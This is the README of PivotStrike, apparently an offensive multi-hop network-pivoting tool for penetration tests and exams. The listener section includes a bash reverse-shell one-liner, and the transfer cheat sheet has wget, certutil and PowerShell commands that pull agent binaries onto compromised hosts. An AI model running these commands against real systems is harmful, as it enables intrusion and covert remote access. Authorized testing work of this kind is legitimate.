<p align="center">
  <img src="docs/banner.svg" alt="PivotStrike" width="700"/>
</p>

<h1 align="center">PivotStrike</h1>

<p align="center">
  <b>Advanced Layer-3 Network Pivoting Framework</b><br/>
  <i>Zero-config. Multi-hop. Exam-ready.</i>
</p>

<p align="center">
  <a href="#-quick-start"><img src="https://img.shields.io/badge/Setup_Time-30_Seconds-brightgreen?style=for-the-badge" alt="Setup Time"/></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge" alt="License"/></a>
  <a href="#-supported-platforms"><img src="https://img.shields.io/badge/Platforms-Linux_%7C_Windows_%7C_macOS-orange?style=for-the-badge" alt="Platforms"/></a>
  <a href="#-features"><img src="https://img.shields.io/badge/SYN_Scan-Supported-purple?style=for-the-badge" alt="SYN Scan"/></a>
</p>

<p align="center">
  <a href="#-installation">Installation</a> &bull;
  <a href="#-quick-start">Quick Start</a> &bull;
  <a href="#-multi-hop-pivoting">Multi-Hop</a> &bull;
  <a href="#-cli-reference">CLI Reference</a> &bull;
  <a href="#-how-it-works">Architecture</a> &bull;
  <a href="#-exam-day-guide">Exam Guide</a>
</p>

---

## What is PivotStrike?

**PivotStrike** is a Layer-3 network pivoting framework that creates a transparent TUN tunnel between your attack machine and compromised hosts. It lets you run **any tool** nmap, CrackMapExec, Evil-WinRM, xfreerdp, curl against internal networks **without proxychains, without SOCKS wrappers, and without manual route configuration**.

Think of it as **ligolo-ng rebuilt from scratch** to eliminate every manual step and failure mode that wastes time during exams and engagements.

---

## Why PivotStrike Over Ligolo-ng?

| Problem with Ligolo-ng | PivotStrike Solution |
|---|---|
| Manual `ip tuntap add` + `ip link set` + `ip route add` before anything works | **Fully automatic** server creates TUN, assigns IP, adds all routes |
| Need `autoroute` command or manual routes for each agent | **Auto-routing** agent reports subnets, routes appear instantly |
| Second pivot needs a **new TUN interface** + new routes | **Single TUN, any depth** chain agents with one flag |
| Multi-hop requires `listener_add` + complex relay setup | **Chain mode** `./pivotstrike-agent -chain <parent>:11601` |
| Interactive console needed to select sessions and start tunnels | **Always-on** every agent's tunnel is live immediately |
| No built-in SOCKS5 fallback | **Built-in SOCKS5** proxy on `:1080` |
| `--ignore-cert` = no TLS security at all | **Certificate pinning** safe self-signed certs |
| Agent exits on network interruption | **Auto-reconnect** with exponential backoff, never exits |
| No join token (anyone can register as an agent) | **Pre-shared token** authentication |
| Stale TUN interfaces after crash | **Auto-cleanup** on shutdown |

### Steps to Double-Pivot: 12+ vs 3

<details>
<summary><b>Click to see the full comparison</b></summary>

#### Ligolo-ng (12+ steps)
```bash
# 1. Create TUN interface
sudo ip tuntap add user kali mode tun ligolo
# 2. Bring it up
sudo ip link set ligolo up
# 3. Start proxy
./proxy -selfcert
# 4. Transfer agent to target 1, run it
./agent -connect <ip>:11601 -ignore-cert
# 5. Select session in interactive console
ligolo-ng>> session
# 6. Add routes
ligolo-ng>> autoroute
# 7. Start tunnel
ligolo-ng>> start
# 8. Create listener for second hop
ligolo-ng>> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
# 9. Create second TUN
sudo ip tuntap add user kali mode tun ligolo2
# 10. Bring up second TUN
sudo ip link set ligolo2 up
# 11. Transfer + run agent on target 2
# 12. Select second session
ligolo-ng>> session
# 13. Add routes for second network
sudo ip route add 172.16.5.0/24 dev ligolo2
# 14. Start second tunnel
ligolo-ng>> start --tun ligolo2
```

#### PivotStrike (3 steps)
```bash
# 1. Start server (auto TUN, auto routes, auto everything)
sudo ./pivotstrike-server

# 2. Run agent on first pivot
./pivotstrike-agent -connect <ip>:11601 -pin <fp> -token <tok>

# 3. Run agent on second pivot (chain through first)
./pivotstrike-agent -chain <target1-ip>:11601
```

**Done.** Both subnets routed. `nmap -sS` works. No extra commands.
</details>

---

## Features

- **TUN Interface** Full Layer-3 routing. Run any tool natively (nmap -sS, nmap -sU, CrackMapExec, Evil-WinRM, RDP, SSH — everything)
- **Zero Configuration** Server creates TUN, assigns addresses, adds routes. No manual setup
- **Automatic Multi-Hop** Chain agents to any depth. One TUN serves all hops
- **Auto Route Discovery** Agents enumerate their interfaces and advertise subnets automatically
- **Auto Route Injection** OS routing table updated instantly when new agents connect
- **Built-in SOCKS5 Proxy** Fallback for tools that need a proxy (browser, proxychains)
- **Certificate Pinning** Secure self-signed TLS without blind trust
- **Pre-shared Token Auth** Prevents unauthorized agent registration
- **Auto-Reconnect** Exponential backoff with jitter, survives network blips, never exits
- **Persistent Agent IDs** Reconnects restore routes without operator intervention
- **Interactive CLI** Status, agents, routes, listeners — all from one console
- **Reverse Shell Relay** Catch callbacks from deep targets through the tunnel
- **Clean Shutdown** TUN interface + routes removed automatically
- **Static Binaries** No dependencies. `CGO_ENABLED=0`. Drop and run
- **Cross-Platform** Linux, Windows, macOS agents (amd64, arm64, arm, 386)

---

## Supported Platforms

| Component | Linux | Windows | macOS |
|-----------|-------|---------|-------|
| **Server** | amd64, arm64 | amd64 | amd64, arm64 |
| **Agent** | amd64, arm64, arm, 386 | amd64, 386 | amd64, arm64 |

---

## Installation

### Option 1: Download Pre-built Binaries

Download from the [Releases](../../releases) page — pick the server for your attack machine and agents for your targets.

### Option 2: Build From Source

```bash
# Requirements: Go >= 1.20
git clone https://github.com/Aizaz-Art/PivotStrike.git
cd PivotStrike

# Build for current platform
make all

# Cross-compile ALL platforms (recommended — pre-builds every agent you might need)
make cross

# Binaries appear in dist/
ls -la dist/
```

---

## Quick Start

### Step 1: Start the Server (Your Attack Machine)

```bash
sudo ./pivotstrike-server
```

That's it. The server will:

1. Generate a TLS certificate (or reuse from last run)
2. Create TUN interface `pivot0` with an unused CGNAT address
3. Start SOCKS5 proxy on `127.0.0.1:1080`
4. Generate a join token
5. Print a **copy-paste ready** agent command

You'll see:

```
╔══════════════════════════════════════════════════════════════════╗
║                     PIVOTSTRIKE SERVER READY                    ║
╚══════════════════════════════════════════════════════════════════╝

  ┌─ Connection ──────────────────────────────────────────────────┐
  │  Listen:  10.10.14.5:11601                                    │
  │  Cert FP: 3f9c1a2b7e8d4f01...                                │
  │  Token:   a1b2c3d4-e5f6-7890-abcd-1234567890ab               │
  └───────────────────────────────────────────────────────────────┘

  ┌─ Deploy Agent (copy-paste this) ──────────────────────────────┐
  │                                                                │
  │  ./pivotstrike-agent -connect 10.10.14.5:11601 \              │
  │    -pin 3f9c... -token a1b2...                                │
  └───────────────────────────────────────────────────────────────┘
```

### Step 2: Deploy the Agent (Compromised Host)

Transfer the agent to the target and run the command the server printed:

```bash
# Linux target
./pivotstrike-agent -connect 10.10.14.5:11601 -pin 3f9c1a2b... -token a1b2c3d4...

# Windows target
.\pivotstrike-agent.exe -connect 10.10.14.5:11601 -pin 3f9c1a2b... -token a1b2c3d4...
```

### Step 3: Use Any Tool — It Just Works

```bash
# SYN scan — works natively, no proxychains
nmap -sS -T4 10.10.20.0/24

# UDP scan
nmap -sU --top-ports 50 10.10.20.5

# SMB enumeration
crackmapexec smb 10.10.20.0/24

# WinRM shell
evil-winrm -i 10.10.20.5 -u admin -p 'P@ssw0rd'

# RDP
xfreerdp /v:10.10.20.5 /u:admin /p:'P@ssw0rd'

# HTTP
curl http://10.10.20.5:8080

# SSH
ssh user@10.10.20.10

# SOCKS5 (for browser or proxychains)
curl --socks5 127.0.0.1:1080 http://10.10.20.5
```

---

## Multi-Hop Pivoting

Found a deeper network? Deploy another agent — no extra TUN interfaces, no extra routes, no complex setup.

### Chain Through an Existing Agent

On a host that can **only** reach the first pivot (not your attack machine directly):

```bash
./pivotstrike-agent -chain 10.10.20.3:11601
```

The `-chain` flag connects through the first agent's relay port instead of directly to your server. No `-pin` or `-token` needed — trust is inherited from the parent.

### Network Topology

```
                    TLS Tunnel              TCP Chain             TCP Chain
┌──────────┐  ←─────────────→  ┌──────────┐  ←───────→  ┌──────────┐  ←───────→  ┌──────────┐
│  Attack   │                  │  Agent 1  │             │  Agent 2  │             │  Agent 3  │
│  Machine  │                  │  (Pivot)  │             │  (Pivot)  │             │  (Pivot)  │
│           │                  │           │             │           │             │           │
│  pivot0   │                  │ relay:    │             │ relay:    │             │ relay:    │
│  TUN      │                  │ :11601    │             │ :11601    │             │ :11601    │
└──────────┘                  └──────────┘             └──────────┘             └──────────┘
     ↕                              ↕                        ↕                        ↕
 10.10.14.x                   10.10.20.x               172.16.5.x              192.168.1.x
                               (auto-routed)            (auto-routed)           (auto-routed)
```

All three internal networks are accessible from your attack machine through the **single** `pivot0` TUN interface.

### Triple Pivot Example

```bash
# Your machine: start server
sudo ./pivotstrike-server

# Host A (10.10.20.3) — first pivot, can reach you
./pivotstrike-agent -connect <your-ip>:11601 -pin <fp> -token <tok>

# Host B (172.16.5.10) — second pivot, can only reach Host A
./pivotstrike-agent -chain 10.10.20.3:11601

# Host C (192.168.1.50) — third pivot, can only reach Host B
./pivotstrike-agent -chain 172.16.5.10:11601

# Now scan the deepest network from your machine:
nmap -sS 192.168.1.0/24
```

---

## CLI Reference

The server provides an interactive CLI for managing your pivoting session:

| Command | Alias | Description |
|---------|-------|-------------|
| `status` | `s` | Overview: agent count, route count, capabilities |
| `agents` | `a` | List all connected agents with hostname, OS, depth, uptime |
| `routes` | `r` | Show full routing table with which agent serves each subnet |
| `listen <id> <bind> <back>` | `l` | Create a reverse listener on an agent |
| `listeners` | `ll` | List active listeners |
| `ping <id>` | | Check if an agent is alive |
| `help` | `h` | Show available commands |
| `quit` | `q` | Shut down cleanly |

### Listener Example (Catch a Reverse Shell)

```
pivot» listen abc12 0.0.0.0:4444 127.0.0.1:4444
[+] Listener active: bound on 0.0.0.0:4444 -> forwarding to 127.0.0.1:4444
```

This binds port 4444 on the pivot host and forwards any connection back to your local port 4444.

```bash
# On deep target — reverse shell pointed at the PIVOT host
bash -i >& /dev/tcp/10.10.20.3/4444 0>&1

# On your attack machine — catch it locally
nc -lvnp 4444
```

---

## Server Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-laddr` | `0.0.0.0:11601` | Listen address for agent connections |
| `-iface` | `pivot0` | TUN interface name |
| `-cidr` | Auto (`100.64.x.0/24`) | TUN interface address/CIDR |
| `-cert` / `-key` | Auto-generated | TLS certificate paths |
| `-token` | Auto-generated | Pre-shared join token |
| `-no-auth` | `false` | Disable token authentication |
| `-no-tun` | `false` | Skip TUN creation (SOCKS5-only mode) |
| `-socks` | `127.0.0.1:1080` | SOCKS5 proxy listen address |
| `-no-socks` | `false` | Disable SOCKS5 proxy |
| `-no-cli` | `false` | Disable interactive CLI (daemon mode) |

## Agent Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-connect` | — | Server address `host:port` (direct mode) |
| `-pin` | — | Server cert SHA-256 fingerprint |
| `-token` | — | Join token from server |
| `-chain` | — | Parent agent address (multi-hop mode) |
| `-relay-listen` | `0.0.0.0:11601` | Relay port for child agents |
| `-insecure` | `false` | Skip cert verification (NOT recommended) |
| `-id-file` | Auto | Path to persist agent ID across restarts |

---

## How It Works

### Architecture Overview

```
┌─────────────────────────────── pivotstrike-server ──────────────────────────────┐
│                                                                                  │
│  ┌──────────┐    ┌────────────┐    ┌─────────────────────────────────────────┐  │
│  │   TUN    │    │   gVisor   │    │           Session Manager              │  │
│  │  pivot0  │◄──►│  NetStack  │◄──►│  ┌──────────┐  ┌──────────────────┐   │  │
│  │          │    │  (TCP/UDP  │    │  │  Route   │  │  Agent Sessions  │   │  │
│  │ Kernel   │    │   /ICMP)   │    │  │  Table   │  │  (yamux mux)     │   │  │
│  │ routing  │    │            │    │  │  (LPM)   │  │                  │   │  │
│  └──────────┘    └────────────┘    │  └──────────┘  └──────────────────┘   │  │
│                                     └─────────────────────────────────────────┘  │
│  ┌──────────┐    ┌────────────┐    ┌──────────────────┐                         │
│  │ SOCKS5   │    │    TLS     │    │   Interactive    │                         │
│  │ :1080    │    │  Listener  │    │   CLI Console    │                         │
│  └──────────┘    │  :11601    │    └──────────────────┘                         │
│                   └────────────┘                                                 │
└──────────────────────────────────────────────────────────────────────────────────┘
                          │
                     TLS + yamux
                          │
┌─────────────────────────────── pivotstrike-agent ───────────────────────────────┐
│                                                                                  │
│  ┌──────────────┐   ┌──────────────┐   ┌────────────────────────────────────┐  │
│  │ Auto-Route   │   │    Relay     │   │       Auto-Reconnect              │  │
│  │ Discovery    │   │   Listener   │   │   (exponential backoff + jitter)  │  │
│  │ (interface   │   │   :11601     │   │   Never gives up. Never exits.    │  │
│  │  enumeration │   │  (for chain) │   │                                    │  │
│  └──────────────┘   └──────────────┘   └────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────────────┘
```

### Key Design Decisions

**Single TUN, Software Routing** Unlike ligolo-ng (one kernel TUN per pivot depth), PivotStrike routes inside the process using a longest-prefix-match table. Adding the 50th subnet is as cheap as the 1st.

**gVisor NetStack for SYN Scans** Raw IP packets from the TUN are terminated by a userland TCP/IP stack. SYN probes get real SYN/ACK or RST responses based on agent-side connect results — nmap reports accurate open/closed/filtered.

**Recursive Nesting** Every agent is a potential relay. A "nested" stream through yamux looks identical to a direct connection from the server's perspective. No special-casing at any depth.

**Connect-Ack Handshake** The agent sends a 1-byte status after `net.Dial` to the real target. This prevents the false-positive "everything looks open" problem that plagues proxy-based scanning.

---

## Exam Day Guide

### Pre-Exam Checklist

```bash
# 1. Build all agent binaries (do this BEFORE the exam)
make cross

# 2. Test the server starts clean
sudo ./dist/pivotstrike-server_linux_amd64
# Ctrl+C to stop

# 3. Start a local HTTP server to transfer agents
cd dist && python3 -m http.server 8888
```

### During the Exam

```bash
# Terminal 1: Start PivotStrike server
sudo ./pivotstrike-server

# Terminal 2: Transfer agent to compromised host

# On Linux target:
wget http://<your-ip>:8888/pivotstrike-agent_linux_amd64 -O /tmp/pa && chmod +x /tmp/pa
/tmp/pa -connect <your-ip>:11601 -pin <fp> -token <tok>

# On Windows target:
certutil -urlcache -f http://<your-ip>:8888/pivotstrike-agent_windows_amd64.exe C:\Temp\pa.exe
C:\Temp\pa.exe -connect <your-ip>:11601 -pin <fp> -token <tok>

# Terminal 3: Your actual pentest work — everything routes through the tunnel
nmap -sS -T4 10.10.20.0/24
crackmapexec smb 10.10.20.0/24
```

### Troubleshooting

| Problem | Fix |
|---------|-----|
| Agent won't connect | Check firewall allows outbound to `:11601`. Try `-insecure` if cert pin is wrong |
| TUN creation fails | Run server with `sudo`. Or: `sudo setcap cap_net_admin+ep ./pivotstrike-server` |
| Routes not working | Check `ip route` — subnets should point to `pivot0` |
| Agent disconnected | It auto-reconnects. Watch server console for reconnection |
| Need SOCKS5 only | Run `./pivotstrike-server -no-tun` for SOCKS5-only mode |
| VPN blip during exam | Both sides auto-reconnect. Routes restore automatically. Wait ~30s |

### File Transfer Cheat Sheet

```bash
# Start HTTP server in your dist/ folder
cd dist && python3 -m http.server 8888

# Linux target
wget http://<IP>:8888/pivotstrike-agent_linux_amd64 -O /tmp/pa && chmod +x /tmp/pa
curl http://<IP>:8888/pivotstrike-agent_linux_amd64 -o /tmp/pa && chmod +x /tmp/pa

# Windows target
certutil -urlcache -f http://<IP>:8888/pivotstrike-agent_windows_amd64.exe C:\Temp\pa.exe
powershell -c "iwr http://<IP>:8888/pivotstrike-agent_windows_amd64.exe -OutFile C:\Temp\pa.exe"

# Via SCP (if you have SSH)
scp pivotstrike-agent_linux_amd64 user@target:/tmp/pa

# Via SMB
impacket-smbserver share dist/ -smb2support
# Then on target: copy \\<IP>\share\pivotstrike-agent_windows_amd64.exe C:\Temp\pa.exe
```

---

## Security Considerations

- **For authorized testing only.** This tool is designed for legitimate penetration testing, security assessments, and certification exams.
- **Certificate pinning** protects the agent-server channel against MITM. Always use `-pin`, not `-insecure`.
- **Join tokens** prevent unauthorized agents from connecting to your server.
- **All traffic is TLS-encrypted** between agent and server.
- The agent binary does **not require privileges** on the target. Only the server needs root/admin for TUN creation.

---

## Contributing

Contributions are welcome! Please open an issue or pull request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

## Acknowledgments

- [gVisor](https://gvisor.dev/) — Userland network stack that makes SYN scans possible
- [yamux](https://github.com/hashicorp/yamux) — Connection multiplexing
- [water](https://github.com/songgao/water) — Cross-platform TUN interface library
- Inspired by [ligolo-ng](https://github.com/nicocha30/ligolo-ng) — the tool that proved TUN-based pivoting is the right approach

---

## License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <b>Built for reliability when it matters most — exam day.</b><br/>
  <i>By <a href="https://github.com/Aizaz-Art">Aizaz Ali</a></i>
</p>
